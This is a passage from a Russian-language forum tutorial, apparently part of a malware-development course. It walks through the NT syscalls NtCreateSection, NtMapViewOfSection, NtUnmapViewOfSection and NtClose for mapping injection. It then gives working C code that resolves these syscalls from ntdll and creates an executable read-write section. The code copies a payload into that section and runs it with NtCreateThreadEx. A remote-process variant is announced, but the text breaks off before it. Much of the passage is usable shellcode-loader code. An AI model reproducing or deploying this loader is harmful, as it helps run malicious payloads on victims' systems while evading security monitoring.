–≠—Ç–æ —Ä–µ–∑—É–ª—å—Ç–∏—Ä—É—é—â–∏–π —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –∏–∑ CreateFileMapping WinAPI. NtCreateSection –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtCreateSection(
OUT PHANDLE SectionHandle, // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é HANDLE, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–ª—É—á–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ–±—ä–µ–∫—Ç–∞ —Å–µ–∫—Ü–∏–∏
IN ACCESS_MASK DesiredAccess, // –¢–∏–ø –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ –∫ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä—É —Å–µ–∫—Ü–∏–∏
IN POBJECT_ATTRIBUTES ObjectAttributes, // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É OBJECT_ATTRIBUTES (—É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –≤ NULL)
IN PLARGE_INTEGER MaximumSize, // –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä —Å–µ–∫—Ü–∏–∏
IN ULONG SectionPageProtection, // –ó–∞—â–∏—Ç–∞, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ –∫–∞–∂–¥–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü–µ –≤ —Å–µ–∫—Ü–∏–∏
IN ULONG AllocationAttributes, // –ê—Ç—Ä–∏–±—É—Ç—ã –≤—ã–¥–µ–ª–µ–Ω–∏—è —Å–µ–∫—Ü–∏–∏ (—Ñ–ª–∞–≥–∏ SEC_XXX)
IN HANDLE FileHandle // –û–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ —É–∫–∞–∑—ã–≤–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ—Ç–∫—Ä—ã—Ç–æ–≥–æ —Ñ–∞–π–ª–∞ (—É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –≤ NULL)
);</code></pre>
	</div>
</div><br />
–•–æ—Ç—è –º–µ–∂–¥—É NtCreateSection –∏ CreateFileMapping –µ—Å—Ç—å –º–Ω–æ–≥–æ —Å—Ö–æ–∂–µ–≥–æ, –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –Ω–æ–≤—ã–µ. –í–æ-–ø–µ—Ä–≤—ã—Ö, –ø–∞—Ä–∞–º–µ—Ç—Ä DesiredAccess –æ–ø–∏—Å—ã–≤–∞–µ—Ç —Ç–∏–ø –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ –∫ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä—É —Å–µ–∫—Ü–∏–∏. –°–ø–∏—Å–æ–∫ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –ø–æ–∫–∞–∑–∞–Ω –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –Ω–∏–∂–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786888790.png"
		data-src="https://osint42.org/attachments/1746786888790-png.238/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786888790-png.238/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786888790.png"
			title="1746786888790.png"
			width="1043" height="435" loading="lazy" />
	</div><br />
<br />
–í —ç—Ç–æ–º –º–æ–¥—É–ª–µ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ª–∏–±–æ SECTION_ALL_ACCESS, –ª–∏–±–æ SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE.<br />
<br />
–î–∞–ª–µ–µ, –ø–∞—Ä–∞–º–µ—Ç—Ä MaximumSize - —ç—Ç–æ —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É LARGE_INTEGER. –ï–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω—ã–π —ç–ª–µ–º–µ–Ω—Ç, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ –∑–∞–ø–æ–ª–Ω–∏—Ç—å, —ç—Ç–æ —ç–ª–µ–º–µ–Ω—Ç LowPart, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç —Ä–∞–≤–µ–Ω —Ä–∞–∑–º–µ—Ä—É –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏. –°—Ç—Ä—É–∫—Ç—É—Ä–∞ LARGE_INTEGER –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef union _LARGE_INTEGER {
struct {
DWORD LowPart;
LONG HighPart;
} DUMMYSTRUCTNAME;
struct {
DWORD LowPart;
LONG HighPart;
} u;
LONGLONG QuadPart;
} LARGE_INTEGER;</code></pre>
	</div>
</div><br />
–ù–∞–∫–æ–Ω–µ—Ü, –ø–∞—Ä–∞–º–µ—Ç—Ä AllocationAttributes –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç –±–∏—Ç–æ–≤—É—é –º–∞—Å–∫—É —Ñ–ª–∞–≥–æ–≤ SEC_XXX, –∫–æ—Ç–æ—Ä–∞—è –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç –∞—Ç—Ä–∏–±—É—Ç—ã –≤—ã–¥–µ–ª–µ–Ω–∏—è —Å–µ–∫—Ü–∏–∏. –°–ø–∏—Å–æ–∫ —Ñ–ª–∞–≥–æ–≤ –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ –∑–¥–µ—Å—å –ø–æ–¥ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º flProtect. –í —ç—Ç–æ–º –º–æ–¥—É–ª–µ —ç—Ç–æ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä –±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ –∑–Ω–∞—á–µ–Ω–∏–µ SEC_COMMIT.<br />
<br />
<b>NtMapViewOfSection</b><br />
<br />
–≠—Ç–æ —Ä–µ–∑—É–ª—å—Ç–∏—Ä—É—é—â–∏–π —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –∏–∑ MapViewOfFile WinAPI. NtMapViewOfSection –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtMapViewOfSection(
IN HANDLE SectionHandle, // HANDLE –æ–±—ä–µ–∫—Ç–∞ —Å–µ–∫—Ü–∏–∏, —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ &#039;NtCreateSection&#039;
IN HANDLE ProcessHandle, // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞, –∫–æ—Ç–æ—Ä–æ–º—É –Ω—É–∂–Ω–æ –æ—Ç–æ–±—Ä–∞–∑–∏—Ç—å –≤–∏–¥
IN OUT PVOID *BaseAddress, // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é PVOID, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–ª—É—á–∞–µ—Ç –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è
IN ULONG ZeroBits, // —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –≤ NULL
IN SIZE_T CommitSize, // —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –≤ NULL
IN OUT PLARGE_INTEGER SectionOffset, // —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –≤ NULL
IN OUT PSIZE_T ViewSize, // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é SIZE_T, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–¥–µ—Ä–∂–∏—Ç —Ä–∞–∑–º–µ—Ä –≤—ã–¥–µ–ª—è–µ–º–æ–π –ø–∞–º—è—Ç–∏
IN SECTION_INHERIT InheritDisposition, // –ö–∞–∫ –≤–∏–¥ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Ä–∞–∑–¥–µ–ª–µ–Ω —Å –¥–æ—á–µ—Ä–Ω–∏–º–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏
IN ULONG AllocationType, // —Ç–∏–ø –≤—ã–¥–µ–ª–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω (—É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –≤ NULL)
IN ULONG Protect // –ó–∞—â–∏—Ç–∞, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ –∫–∞–∂–¥–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü–µ –≤ —Å–µ–∫—Ü–∏–∏
);</code></pre>
	</div>
</div><br />
–í —ç—Ç–æ–º –º–æ–¥—É–ª–µ –ø–∞—Ä–∞–º–µ—Ç—Ä SectionHandle –±—É–¥–µ—Ç –ø–æ–ª—É—á–µ–Ω –∏–∑ –≤—ã–∑–æ–≤–∞ NtCreateSection. –ü–∞—Ä–∞–º–µ—Ç—Ä ProcessHandle –±—É–¥–µ—Ç —Ä–∞–≤–µ–Ω —Ç–µ–∫—É—â–µ–º—É –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä—É –ø—Ä–æ—Ü–µ—Å—Å–∞, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–æ–ª—É—á–µ–Ω —Å –ø–æ–º–æ—â—å—é —Ñ—É–Ω–∫—Ü–∏–∏ GetCurrentProcess.<br />
<br />
–ü–∞—Ä–∞–º–µ—Ç—Ä BaseAddress –ø–æ–ª—É—á–∞–µ—Ç –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è. –ó–Ω–∞—á–µ–Ω–∏–µ —ç—Ç–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –±—É–¥–µ—Ç —É–∫–∞–∑–∞–Ω–æ –ø–æ–∑–∂–µ.<br />
<br />
–ü–∞—Ä–∞–º–µ—Ç—Ä ViewSize —Å–æ–¥–µ—Ä–∂–∏—Ç —Ä–∞–∑–º–µ—Ä –≤—ã–¥–µ–ª—è–µ–º–æ–π –ø–∞–º—è—Ç–∏, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç —Ä–∞–≤–µ–Ω —Ä–∞–∑–º–µ—Ä—É –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
<br />
–ü–∞—Ä–∞–º–µ—Ç—Ä InheritDisposition –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç, –∫–∞–∫ –≤–∏–¥ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Ä–∞–∑–¥–µ–ª–µ–Ω —Å –¥–æ—á–µ—Ä–Ω–∏–º–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏. –í —ç—Ç–æ–º –º–æ–¥—É–ª–µ —ç—Ç–æ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä –±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ –∑–Ω–∞—á–µ–Ω–∏–µ &#039;ViewUnmap&#039;, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –¥–æ—á–µ—Ä–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å—ã –Ω–µ –±—É–¥—É—Ç –∏–º–µ—Ç—å –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –≤–∏–¥—É. –ù–∞–∫–æ–Ω–µ—Ü, –ø–∞—Ä–∞–º–µ—Ç—Ä Protect —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç —É—Ä–æ–≤–µ–Ω—å –∑–∞—â–∏—Ç—ã –¥–ª—è –∫–∞–∂–¥–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã –≤ —Å–µ–∫—Ü–∏–∏. –í —ç—Ç–æ–º –º–æ–¥—É–ª–µ —ç—Ç–æ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä –±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ –∑–Ω–∞—á–µ–Ω–∏–µ &#039;PAGE_READWRITE&#039;, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –º–æ–∂–Ω–æ –±—É–¥–µ—Ç —á–∏—Ç–∞—Ç—å –∏ –∑–∞–ø–∏—Å—ã–≤–∞—Ç—å.<br />
<br />
<b>NtUnmapViewOfSection </b><br />
<br />
–≠—Ç–æ —Ä–µ–∑—É–ª—å—Ç–∏—Ä—É—é—â–∏–π —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –∏–∑ UnmapViewOfFile WinAPI. NtUnmapViewOfSection –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtUnmapViewOfSection(
IN HANDLE ProcessHandle, // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞, –∫–æ—Ç–æ—Ä–æ–º—É –Ω—É–∂–Ω–æ –æ—Ç–º–µ–Ω–∏—Ç—å –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ
IN PVOID BaseAddress // –ë–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä—ã–π –±—ã–ª –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω —Ä–∞–Ω–µ–µ
);</code></pre>
	</div>
</div>
	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code></code></pre>
	</div>
</div><br />
–í —ç—Ç–æ–º –º–æ–¥—É–ª–µ –ø–∞—Ä–∞–º–µ—Ç—Ä ProcessHandle –±—É–¥–µ—Ç —Ä–∞–≤–µ–Ω —Ç–µ–∫—É—â–µ–º—É –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä—É –ø—Ä–æ—Ü–µ—Å—Å–∞, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–æ–ª—É—á–µ–Ω —Å –ø–æ–º–æ—â—å—é —Ñ—É–Ω–∫—Ü–∏–∏ GetCurrentProcess. –ü–∞—Ä–∞–º–µ—Ç—Ä BaseAddress –±—É–¥–µ—Ç –±–∞–∑–æ–≤—ã–º –∞–¥—Ä–µ—Å–æ–º –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä—ã–π –±—ã–ª –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω —Ä–∞–Ω–µ–µ.<br />
<br />
NtClose –≠—Ç–æ —Ä–µ–∑—É–ª—å—Ç–∏—Ä—É—é—â–∏–π —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –∏–∑ CloseHandle WinAPI. NtClose –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtClose(
IN HANDLE Handle // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ –∑–∞–∫—Ä—ã—Ç—å
);</code></pre>
	</div>
</div><br />
–í —ç—Ç–æ–º –º–æ–¥—É–ª–µ –ø–∞—Ä–∞–º–µ—Ç—Ä Handle –±—É–¥–µ—Ç –ª–∏–±–æ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–æ–º —Å–µ–∫—Ü–∏–∏, –ø–æ–ª—É—á–µ–Ω–Ω—ã–º –∏–∑ –≤—ã–∑–æ–≤–∞ NtCreateSection, –ª–∏–±–æ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–æ–º –ø—Ä–æ—Ü–µ—Å—Å–∞, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–æ–ª—É—á–µ–Ω —Å –ø–æ–º–æ—â—å—é —Ñ—É–Ω–∫—Ü–∏–∏ GetCurrentProcess.<br />
<br />
<b>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º GetProcAddress –∏ GetModuleHandle</b><br />
<br />
–°–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º —è–≤–ª—è–µ—Ç—Å—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è –º–µ—Ç–æ–¥–∞ –∏–Ω—ä–µ–∫—Ü–∏–∏ —á–µ—Ä–µ–∑ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ä–∞–Ω–µ–µ –ø–æ–∫–∞–∑–∞–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤. –ê–Ω–∞–ª–æ–≥–∏—á–Ω–æ –ø—Ä–µ–¥—ã–¥—É—â–µ–º—É –º–æ–¥—É–ª—é, –º–µ—Ç–æ–¥ –±—É–¥–µ—Ç –ø–æ–∫–∞–∑–∞–Ω —Ç—Ä–µ–º—è —Å–ø–æ—Å–æ–±–∞–º–∏, –Ω–∞—á–∏–Ω–∞—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è GetProcAddress –∏ GetModuleHandle.<br />
<br />
–°—Ç—Ä—É–∫—Ç—É—Ä–∞ Syscall —Å–æ–∑–¥–∞–µ—Ç—Å—è –∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ—Ç—Å—è —Å –ø–æ–º–æ—â—å—é InitializeSyscallStruct, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–¥–µ—Ä–∂–∏—Ç –∞–¥—Ä–µ—Å–∞ –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// —Å—Ç—Ä—É–∫—Ç—É—Ä–∞, –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤
typedef struct _Syscall {

    fnNtCreateSection       pNtCreateSection;
    fnNtMapViewOfSection    pNtMapViewOfSection;
    fnUnmapViewOfSection    pNtUnmapViewOfSection;
    fnNtClose               pNtClose;
    fnNtCreateThreadEx      pNtCreateThreadEx;

}Syscall, * PSyscall;

// —Ñ—É–Ω–∫—Ü–∏—è, –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –¥–ª—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è –≤—Ö–æ–¥–Ω–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã &#039;St&#039;
BOOL InitializeSyscallStruct (OUT PSyscall St) {

    HMODULE hNtdll    = GetModuleHandle(L&quot;NTDLL.DLL&quot;);
    if (!hNtdll) {
        printf(&quot;[!] GetModuleHandle –Ω–µ —É–¥–∞–ª–æ—Å—å. –û—à–∏–±–∫–∞: %d \n&quot;, GetLastError());
        return FALSE;
    }

    St-&gt;pNtCreateSection         = (fnNtCreateSection)GetProcAddress(hNtdll, &quot;NtCreateSection&quot;);
    St-&gt;pNtMapViewOfSection      = (fnNtMapViewOfSection)GetProcAddress(hNtdll, &quot;NtMapViewOfSection&quot;);
    St-&gt;pNtUnmapViewOfSection    = (fnUnmapViewOfSection)GetProcAddress(hNtdll, &quot;NtUnmapViewOfSection&quot;);
    St-&gt;pNtClose                 = (fnNtClose)GetProcAddress(hNtdll, &quot;NtClose&quot;);
    St-&gt;pNtCreateThreadEx        = (fnNtCreateThreadEx)GetProcAddress(hNtdll, &quot;NtCreateThreadEx&quot;);

     // –ø—Ä–æ–≤–µ—Ä–∫–∞, –ø—Ä–æ–ø—É—Å—Ç–∏–ª –ª–∏ GetProcAddress —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤
    if (St-&gt;pNtCreateSection == NULL || St-&gt;pNtMapViewOfSection == NULL || St-&gt;pNtUnmapViewOfSection == NULL || St-&gt;pNtClose == NULL || St-&gt;pNtCreateThreadEx == NULL)
        return FALSE;
    else
        return TRUE;
}</code></pre>
	</div>
</div><br />
–§—É–Ω–∫—Ü–∏–∏ LocalMappingInjectionViaSyscalls –∏ RemoteMappingInjectionViaSyscalls –æ—Ç–≤–µ—á–∞—é—Ç –∑–∞ –∏–Ω—ä–µ–∫—Ü–∏—é –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ (pPayload) –≤ –ª–æ–∫–∞–ª—å–Ω—ã–π –∏ —É–¥–∞–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å (hProcess) —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ.<br />
–û–±–µ —Ñ—É–Ω–∫—Ü–∏–∏ –ø–æ–∫–∞–∑–∞–Ω—ã –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL LocalMappingInjectionViaSyscalls(IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection        = NULL;
    HANDLE                hThread            = NULL;
    PVOID                pAddress        = NULL;
    NTSTATUS            STATUS            = NULL;
    SIZE_T                sViewSize        = NULL;
    LARGE_INTEGER        MaximumSize        = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };
    Syscall                St                = { 0 };

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã &#039;St&#039; –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–æ–≤ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤
    if (!InitializeSyscallStruct(&amp;St)) {
        printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
        return FALSE;
    }

//--------------------------------------------------------------------------
    // –í—ã–¥–µ–ª–µ–Ω–∏–µ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è

    if ((STATUS = St.pNtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    if ((STATUS = St.pNtMapViewOfSection(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sViewSize);

//--------------------------------------------------------------------------
    // –ó–∞–ø–∏—Å—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏

    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();
    memcpy(pAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pAddress);

//--------------------------------------------------------------------------

    // –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —Å –ø–æ–º–æ—â—å—é —Å–æ–∑–¥–∞–Ω–∏—è –ø–æ—Ç–æ–∫–∞

    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
    if ((STATUS = St.pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);
    printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

